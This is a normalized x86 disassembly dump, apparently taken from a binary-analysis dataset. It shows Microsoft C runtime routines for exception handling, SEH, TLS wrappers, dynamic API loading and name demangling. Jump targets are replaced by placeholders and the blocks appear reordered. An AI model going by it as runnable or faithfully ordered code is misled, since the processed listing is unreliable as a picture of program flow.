mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov esi [ esi ]
push ebx
mov ebx [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] 0xe0434f4d
je r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi ] 0xe06d7363
jne r-xdata
cmp [ esi ] 0xe0434352
je r-xdata
cmp [ esi ] 0xe06d7363
jne r-xdata
call sub_40eb1b
inc [ eax + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
test bl 0x40
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
pop edi
pop ebx
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
call sub_40eb1b
cmp [ eax + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
mov eax [ esi + 0x1c ]
or ebx 0x80000000
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x14 ] ebx
mov eax [ eax + 0xc ]
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
jmp r-xdata
call sub_40eb1b
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
test edi edi
jg r-xdata
call sub_40eb1b
mov esi [ eax + 0x10 ]
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call sub_40fd3e
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
call sub_40eb1b
inc [ eax + 0x18 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
dec edi
add ebx 0x4
xor eax eax
inc eax
push [ ebp - 0x4 ]
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_40f5da
add esp 0x10
jmp r-xdata
sub_40f939
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
test esi esi
je r-xdata
or [ edi + 0x8 ] 0xffffffff
or [ edi + 0xc ] 0xffffffff
mov esi [ esi ]
test esi esi
je r-xdata
xor eax eax
inc eax
pop ebp
retn
call sub_40eb1b
and [ eax + 0x18 ] 0x0
cmp [ esi ] 0xe06d7363
jne r-xdata
push [ esi + 0x18 ]
push edi
call sub_40d6d9
pop ecx
pop ecx
call sub_40eb1b
mov eax [ eax + 0x10 ]
mov [ edi + 0x8 ] eax
call sub_40eb1b
mov eax [ eax + 0x14 ]
mov [ edi + 0xc ] eax
call sub_40eb1b
mov [ eax + 0x10 ] esi
jmp r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
call sub_40eb1b
dec [ eax + 0x18 ]
call sub_40eb1b
pop edi
pop esi
cmp [ eax + 0x18 ] 0x0
jge r-xdata
cmp [ esi + 0x14 ] 0x19930520
je r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
call sub_40eb1b
mov esi [ eax + 0x10 ]
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
sub_40f9db
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x8 ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
push ebx
push esi
call sub_40d6fd
cmp [ ebp + 0xc ] 0x0
mov ebx 0xe06d7363
pop ecx
jne r-xdata
call sub_40eb1b
mov eax [ eax + 0x10 ]
cmp [ eax ] ebx
pop ebx
jne r-xdata
call sub_40eb1b
mov eax [ eax + 0x10 ]
cmp [ eax ] ebx
jne r-xdata
call sub_40eb1b
mov ecx [ esi + 0x8 ]
mov [ eax + 0x10 ] ecx
call sub_40eb1b
mov ecx [ esi + 0xc ]
mov [ eax + 0x14 ] ecx
call sub_40eb1b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x10 ] 0x3
jne r-xdata
call sub_40eb1b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x10 ] 0x3
jne r-xdata
call sub_40eb1b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
call sub_40eb1b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
call sub_40eb1b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_40eb1b
mov eax [ eax + 0x10 ]
push [ eax + 0x18 ]
call sub_40d745
pop ecx
test eax eax
je r-xdata
call sub_40eb1b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
call sub_40eb1b
dec [ eax + 0x18 ]
call sub_40eb1b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
push 0x1
call sub_40eb1b
push [ eax + 0x10 ]
call sub_40ec3c
pop ecx
pop ecx
call sub_40eb1b
mov eax [ eax + 0x10 ]
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sub_40fae7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe0434352
je r-xdata
call sub_40eb1b
cmp [ eax + 0x18 ] 0x0
jle r-xdata
cmp [ eax ] 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_40eb1b
dec [ eax + 0x18 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
call sub_40eb1b
and [ eax + 0x18 ] 0x0
jmp sub_42cf31
sub_40fb2c
push 0x10
push r--data
call sub_40d260
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x4 ] 0x80
mov eax [ ebp + 0x8 ]
jg r-xdata
mov esi [ eax + 0x8 ]
movsx esi [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fbe0
cmp esi [ ebp + 0x14 ]
jne r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_40eb1b
inc [ eax + 0x18 ]
and [ ebp - 0x4 ] 0x0
call sub_42cf31
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] esi
call sub_40d2a6
retn
mov ecx [ ebp + 0x10 ]
cmp esi [ ecx + 0x4 ]
jge r-xdata
mov eax [ ecx + 0x8 ]
mov edx [ eax + esi * 8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] 0x1
cmp [ eax + esi * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
push 0x103
push eax
mov eax [ ecx + 0x8 ]
push [ eax + esi * 8 + 0x4 ]
call sub_40ebf0
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_40fbf4
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
and [ esi ] 0x0
call sub_40eb1b
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
test [ ecx ] 0x10
je r-xdata
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
push rw-data
call sub_40fe03
pop ecx
pop ecx
mov [ esi ] eax
mov eax [ eax + 0x18 ]
mov eax [ eax ]
mov eax [ eax - 0x4 ]
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_40fc42
push ebp
mov ebp esp
push ebx
push esi
push edi
push [ ebp + 0x10 ]
call sub_40fea7
pop ecx
call sub_40eb1b
mov ecx [ ebp + 0x18 ]
xor esi esi
mov edx [ ebp + 0x8 ]
mov ebx 0x1fffffff
mov edi 0x19930522
cmp [ eax + 0x20 ] esi
jne r-xdata
test [ edx + 0x4 ] 0x66
je r-xdata
cmp [ edx ] 0xe06d7363
je r-xdata
cmp [ ecx + 0xc ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
cmp [ edx ] 0x80000026
je r-xdata
cmp [ edx ] 0xe06d7363
jne r-xdata
mov eax [ ecx ]
and eax ebx
cmp eax 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] esi
jne r-xdata
mov eax [ ecx ]
and eax ebx
cmp eax edi
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_40f017
add esp 0x20
cmp [ edx + 0x10 ] 0x3
jb r-xdata
cmp eax edi
jb r-xdata
cmp [ ecx + 0x1c ] esi
jne r-xdata
push 0xffffffff
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_40fb2c
add esp 0x10
jmp r-xdata
test [ ecx + 0x20 ] 0x1
jne r-xdata
cmp [ edx + 0x14 ] edi
jbe r-xdata
test [ ecx + 0x20 ] 0x4
je r-xdata
mov eax [ edx + 0x1c ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
movzx eax [ ebp + 0x24 ]
push eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ecx
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call j_sub_40d468
call esi
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40fd3e
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov eax [ edx + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea ecx [ eax + 0x8 ]
cmp [ ecx ] 0x0
je r-xdata
test [ edx ] 0x80
mov edi [ ebp + 0xc ]
je r-xdata
mov ebx [ edi + 0x4 ]
xor esi esi
cmp eax ebx
je r-xdata
test [ edi ] 0x10
jne r-xdata
test [ edi ] 0x2
je r-xdata
lea eax [ ebx + 0x8 ]
mov eax [ ebp + 0x10 ]
test [ eax ] 0x1
je r-xdata
test [ edx ] 0x8
je r-xdata
sbb eax eax
or eax 0x1
test bl bl
je r-xdata
test [ eax ] 0x2
je r-xdata
test [ edx ] 0x1
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax esi
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ eax + 0x1 ]
jne r-xdata
xor esi esi
inc esi
test [ edx ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test eax eax
je r-xdata
add ecx 0x2
add eax 0x2
test bl bl
jne r-xdata
mov bl [ ecx ]
cmp bl [ eax ]
jne r-xdata
sub_40fe03
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_42cf31
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
je r-xdata
mov eax [ eax + 0x1c ]
push ebx
push esi
push edi
mov eax [ eax + 0xc ]
mov ecx [ eax ]
lea esi [ eax + 0x4 ]
test ecx ecx
jle r-xdata
cmp [ eax + 0x14 ] 0x19930521
je r-xdata
xor eax eax
mov edi [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x19930522
jne r-xdata
sbb eax eax
or eax 0x1
test bl bl
je r-xdata
xor eax eax
inc eax
jmp r-xdata
dec ecx
add esi 0x4
test ecx ecx
jg r-xdata
xor eax eax
jmp r-xdata
mov bl [ edx + 0x1 ]
cmp bl [ eax + 0x1 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi ]
lea edx [ edi + 0x8 ]
mov eax [ eax + 0x4 ]
add eax 0x8
test eax eax
je r-xdata
add edx 0x2
add eax 0x2
test bl bl
jne r-xdata
mov bl [ edx ]
cmp bl [ eax ]
jne r-xdata
sub_410056
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
push [ esi ]
call sub_410118
pop ecx
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebp
retn
add esi 0x4
sub_410078
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
push esi
push edi
lea ebx [ eax * 4 + rw-data ]
xor eax eax
[ ebx ] ecx
mov edx [ rw-data ]
or edi 0xffffffff
mov ecx edx
mov esi edx
and ecx 0x1f
xor esi eax
ror esi cl
cmp esi edi
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov esi [ ebp + 0x10 ]
cmp esi [ ebp + 0x14 ]
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
push [ esi ]
call sub_410118
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax edx
push 0x20
and eax 0x1f
pop ecx
sub ecx eax
ror edi cl
xor edi edx
xchg [ ebx ] edi
push [ ebp + 0xc ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
add esi 0x4
cmp esi [ ebp + 0x14 ]
jne r-xdata
mov edx [ rw-data ]
push esi
call sub_40fed5
pop ecx
xchg [ ebx ] eax
jmp r-xdata
test eax eax
je r-xdata
mov edx [ rw-data ]
sub_410118
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
xor ecx ecx
push edi
xor eax eax
lea edi [ ebx * 4 + rw-data ]
[ edi ] ecx
mov ecx eax
test ecx ecx
je r-xdata
mov ebx [ ebx * 4 + r--data ]
push esi
push 0x800
push 0x0
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
neg eax
sbb eax eax
and eax ecx
jmp r-xdata
mov eax esi
xchg [ edi ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
pop edi
pop ebx
pop ebp
retn
mov eax esi
push esi
call [ FreeLibrary@IAT ]
xor esi esi
push esi
push esi
push ebx
call [ LoadLibraryExW@IAT ]
mov esi eax
jmp r-xdata
or eax 0xffffffff
xchg [ edi ] eax
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
pop esi
sub_410199
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
jmp r-xdata
cmp esi [ ebp + 0x10 ]
jne r-xdata
push [ esi ]
call sub_410118
pop ecx
test eax eax
jne r-xdata
xor eax eax
pop esi
test eax eax
jne r-xdata
add esi 0x4
push [ ebp + 0x8 ]
push eax
call [ GetProcAddress@IAT ]
pop ebp
retn
pop ebp
retn
sub_4101cb
push ebp
mov ebp esp
push 0x800
push 0x0
push [ ebp + 0x8 ]
call [ LoadLibraryExW@IAT ]
test eax eax
jne r-xdata
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
xor eax eax
push 0x0
push 0x0
push [ ebp + 0x8 ]
call [ LoadLibraryExW@IAT ]
pop ebp
retn
sub_410200
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x0
call sub_410078
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_40d468
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_410240
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x1
call sub_410078
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0x18 ]
mov ecx esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_40d468
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_410283
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x2
call sub_410078
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call j_sub_40d468
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_4102bd
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x3
call sub_410078
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push 0x32
pop eax
push [ ebp + 0x20 ]
mov ecx esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_40d468
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_410306
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x4
call sub_410078
mov esi eax
add esp 0x10
test esi esi
je r-xdata
pop esi
pop ebp
jmp [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
mov ecx esi
call j_sub_40d468
call esi
pop esi
pop ebp
retn
sub_410340
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x5
call sub_410078
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsFree@IAT ]
mov ecx esi
call j_sub_40d468
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_41037a
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x6
call sub_410078
add esp 0x10
mov esi eax
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsGetValue@IAT ]
mov ecx esi
call j_sub_40d468
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_4103b4
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x7
call sub_410078
add esp 0x10
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
test esi esi
je r-xdata
call [ TlsSetValue@IAT ]
mov ecx esi
call j_sub_40d468
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_4103f1
push ebp
mov ebp esp
push esi
push r--data
push r--data
push r--data
push 0x8
call sub_410078
mov esi eax
add esp 0x10
test esi esi
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_40d468
call esi
jmp r-xdata
pop esi
pop ebp
retn
sub_410437
mov eax [ rw-data ]
push edi
push 0x20
and eax 0x1f
mov edi rw-data
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
push 0x9
pop ecx
[ edi ]
pop edi
retn
sub_41045b
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push esi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jne r-xdata
cmp [ esi ] 0xffffffff
je r-xdata
cmp [ esi ] 0x0
je r-xdata
pop esi
and [ esi ] 0x0
push [ esi ]
call [ FreeLibrary@IAT ]
sub_410490
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_410520
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_416785
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_4167a4
jmp r-xdata
sub_410520
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40c3ae
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_410490
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_410566
push ebp
push [ esp + 0x8 ]
call sub_40fea8
add esp 0x4
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_410490
add esp 0xc
pop ebp
retn 0x4
sub_41058e
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_4105be
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4105ee
push esi
push edi
mov edi rw-data
xor esi esi
call sub_41063f
xor al al
inc [ rw-data ]
add esi 0x18
add edi 0x18
cmp esi 0x18
jb r-xdata
push 0x0
push 0xfa0
push edi
call sub_4103f1
add esp 0xc
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
pop edi
pop esi
retn
sub_41063f
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov al 0x1
pop esi
retn
imul eax esi 0x18
push edi
lea edi [ eax + rw-data ]
push edi
call [ DeleteCriticalSection@IAT ]
dec [ rw-data ]
sub edi 0x18
sub esi 0x1
jne r-xdata
pop edi
sub_4106db
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
mov edi [ ebp + 0x8 ]
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
and [ esi + 0x4 ] 0xffff00ff
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov [ esi + 0x4 ] 0x2
cmp [ ecx ] 0x0
je r-xdata
mov [ esi + 0x4 ] 0x1
jmp r-xdata
xor edx edx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edx
push ecx
mov ecx esi
call sub_411f34
mov eax [ edi ]
mov cl [ eax ]
test cl cl
je r-xdata
cmp al 0x5f
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc eax
mov [ edi ] eax
cmp cl [ ebp + 0xc ]
je r-xdata
lea eax [ ebx + 0x1 ]
inc edx
mov [ edi ] eax
cmp [ eax ] 0x0
jne r-xdata
cmp al 0x24
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x3
jmp r-xdata
mov ebx [ edi ]
mov al [ ebx ]
cmp al [ ebp + 0xc ]
je r-xdata
cmp al 0x3c
je r-xdata
cmp al 0x3e
je r-xdata
cmp al 0x2d
je r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x41
jl r-xdata
cmp al 0x7a
jle r-xdata
cmp al 0x30
jl r-xdata
cmp al 0x5a
jle r-xdata
cmp al 0x80
jb r-xdata
cmp al 0x39
jle r-xdata
test [ rw-data ] 0x10000
je r-xdata
cmp al 0xfe
jbe r-xdata
sub_4107aa
push ebp
mov ebp esp
push esi
mov esi ecx
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
and [ esi + 0x4 ] 0xffff00ff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x1
lea eax [ ebp + 0x8 ]
push eax
call sub_411f34
sub_4107d6
push ebp
mov ebp esp
push ebx
xor ebx ebx
push esi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov [ esi + 0x4 ] bl
push ebx
push 0x8
mov ecx rw-data
call sub_413d8f
test eax eax
je r-xdata
test ebx ebx
setne al
dec al
and al 0x3
mov [ esi + 0x4 ] al
jmp r-xdata
push [ ebp + 0x8 ]
mov ecx eax
call sub_410a61
mov ebx eax
and [ esi + 0x4 ] 0xffff00ff
mov eax esi
mov [ esi ] ebx
pop esi
pop ebx
pop ebp
retn 0x4
sub_410823
push ebp
mov ebp esp
push esi
mov esi ecx
xor eax eax
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x4 ] al
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] eax
test ecx ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ ecx ] al
je r-xdata
inc eax
cmp [ eax + ecx ] 0x0
jne r-xdata
test eax eax
je r-xdata
push eax
push ecx
mov ecx esi
call sub_411f34
sub_41085d
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0xffff00ff
cmp eax 0x2
je r-xdata
mov ecx eax
cmp eax 0x3
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push eax
call sub_4163e5
mov [ esi ] eax
pop ecx
test eax eax
jne r-xdata
xor ecx ecx
jmp r-xdata
mov [ esi + 0x4 ] 0x3
and [ esi ] 0x0
mov [ esi + 0x4 ] cl
cmp eax 0x1
jne r-xdata
sub_4108b1
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0xc ]
mov eax ecx
xor ecx ecx
mov [ ebp - 0x24 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
lea esi [ ebp - 0x7 ]
mov [ eax + 0x4 ] cl
and [ eax + 0x4 ] 0xffff00ff
mov [ eax ] ecx
mov [ ebp - 0x7 ] cl
mov [ ebp - 0x1d ] cl
cmp edx ecx
jg r-xdata
push ebx
jl r-xdata
push ecx
push 0xa
push edx
push edi
dec esi
call sub_449720
add cl 0x30
mov [ ebp - 0x28 ] ebx
mov edi eax
mov [ esi ] cl
or eax edx
push 0x0
pop ecx
jne r-xdata
pop ebx
cmp [ ebp - 0x1d ] cl
je r-xdata
neg edi
mov [ ebp - 0x1d ] 0x1
adc edx ecx
neg edx
cmp edi ecx
jae r-xdata
lea ecx [ ebp - 0x7 ]
sub ecx esi
push ecx
mov ecx [ ebp - 0x24 ]
push esi
call sub_411f34
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x24 ]
xor ecx ebp
pop edi
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x8
dec esi
mov [ esi ] 0x2d
sub_410944
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ ebp - 0x8 ] 0x0
push edi
lea edi [ ebp - 0x8 ]
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
and [ esi + 0x4 ] 0xffff00ff
push 0x0
push 0xa
push edx
push ebx
dec edi
call sub_449720
mov [ ebp - 0x20 ] ebx
add cl 0x30
mov ebx eax
mov [ edi ] cl
or eax edx
jne r-xdata
lea ecx [ ebp - 0x8 ]
sub ecx edi
push ecx
push edi
mov ecx esi
call sub_411f34
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x8
sub_4109ba
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
dec eax
neg eax
mov [ ecx ] r--data
sbb eax eax
and eax 0xfffffffc
add eax 0x4
mov [ ecx + 0x8 ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4109e3
push ebp
mov ebp esp
or [ ecx ] 0xffffffff
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
lea esi [ ecx + 0x2c ]
or [ esi ] 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] eax
test edx edx
je r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov eax [ ebp + 0x10 ]
mov [ rw-data ] eax
mov [ rw-data ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
mov [ rw-data ] esi
mov [ rw-data ] eax
mov eax ecx
mov [ rw-data ] ecx
mov [ rw-data ] 0x0
pop esi
pop ebp
retn 0x14
sub_410a61
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] r--data
test eax eax
je r-xdata
mov [ ecx + 0x4 ] eax
mov eax ecx
pop ebp
retn 0x4
mov dl [ eax + 0x4 ]
cmp dl 0x2
je r-xdata
xor eax eax
cmp dl 0x3
jne r-xdata
sub_410aa8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
mov edi [ ebp + 0xc ]
mov [ esi ] r--data
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x0
push edi
mov ecx rw-data
call sub_413d8f
mov ecx eax
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] ecx
test ecx ecx
je r-xdata
and [ esi + 0x8 ] 0x0
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
